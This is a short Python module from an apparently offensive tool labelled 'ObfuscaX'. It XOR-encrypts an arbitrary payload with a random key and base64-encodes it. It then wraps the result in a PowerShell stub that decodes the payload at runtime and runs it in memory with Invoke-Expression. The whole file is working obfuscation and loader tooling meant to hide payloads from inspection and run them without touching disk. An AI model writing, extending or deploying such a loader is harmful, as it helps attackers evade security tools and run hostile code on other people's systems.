import base64
import random
import logging

logger = logging.getLogger("ObfuscaX")

def xor_encrypt(data, key):
    encrypted = bytearray()
    for b in data:
        encrypted.append(b ^ key)
    return encrypted

def dynamic_obfuscate(payload, in_memory=False, xor_key=None):
    logger.info("Starting dynamic obfuscation...")

    if isinstance(payload, str):
        payload = payload.encode()

    if xor_key is None:
        xor_key = random.randint(1, 255)
    logger.debug(f"Using XOR key: {xor_key}")

    encrypted = xor_encrypt(payload, xor_key)
    b64_encrypted = base64.b64encode(encrypted).decode()

    # PowerShell stub to decode & execute
    ps_template = f'''
$encoded = "{b64_encrypted}"
$key = {xor_key}
$bytes = [Convert]::FromBase64String($encoded)
for ($i=0; $i -lt $bytes.Length; $i++) {{
    $bytes[$i] = $bytes[$i] -bxor $key
}}
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
Invoke-Expression $decoded
'''

    if in_memory:
        logger.info("Preparing in-memory execution PowerShell payload.")
        return ps_template.encode()
    else:
        logger.info("Returning dynamic obfuscated payload as raw bytes.")
        return encrypted
